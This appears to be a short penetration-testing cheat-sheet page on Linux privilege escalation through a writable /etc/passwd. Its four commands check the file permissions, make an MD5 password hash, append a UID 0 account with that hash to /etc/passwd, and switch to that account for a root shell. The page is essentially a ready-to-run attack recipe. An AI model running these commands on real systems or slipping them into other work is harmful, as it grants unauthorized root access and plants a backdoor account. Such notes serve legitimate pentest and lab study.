---
title: "Writable /etc/passwd"
date: 2024-7-1
tags: ["passwd", "shadow", "/etc/passwd", "privesc"]
---

### Abuse #1: Writable /etc/passwd

<div>

```console
# Check
ls -l /etc/passwd /etc/shadow
```

```console
# Create password hash
openssl passwd -1 password
```

```console
# Add to /etc/passwd
echo 'user:$1$mQ8Xk.u8$XjFlyg01xLRjhCK/v//Qe/:0:0:comment:/root:/bin/bash' >> /etc/passwd
```

```console
# Get root shell
su - user
```

</div>

<br>